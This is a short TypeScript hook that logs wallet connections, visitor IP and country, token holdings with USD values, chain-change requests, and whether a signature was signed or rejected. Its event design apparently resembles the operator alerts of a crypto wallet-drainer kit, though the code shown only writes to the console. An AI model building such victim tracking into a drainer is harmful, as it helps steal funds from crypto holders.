export const useWalletNotifications = () => {
  const notify = {
    newConnection: (wallet: string, ip: string, country: string) => {
      console.log(`✨ New Connection: ${ip}\n${wallet} - ${country}`)
    },
    
    tokenStrategy: (tokens: any[]) => {
      console.log('💫 Prompt-Strategy:\n' + 
        tokens.map(t => `* ${t.symbol}: ${t.amount}`).join('\n'))
    },
    
    chainChange: (wallet: string, ip: string, country: string) => {
      console.log(`🔗 Requesting Chain Change: ${ip}\n${wallet} - ${country}`)
    },
    
    signedStrategy: (wallet: string, ip: string, country: string, tokens: any[]) => {
      console.log(`✅ Signed Strategy: ${ip}\n${wallet} - ${country}\n\n` +
        tokens.map(t => `* ${t.symbol}: ${t.valueUSD}`).join('\n'))
    },
    
    rejectedSign: (wallet: string, ip: string, country: string, tokens: any[]) => {
      console.log(`❌ Sign Rejected - ${ip}\n${wallet} - ${country}\n\n` +
        tokens.map(t => `* ${t.symbol}: ${t.valueUSD}`).join('\n'))
    }
  }

  return notify
}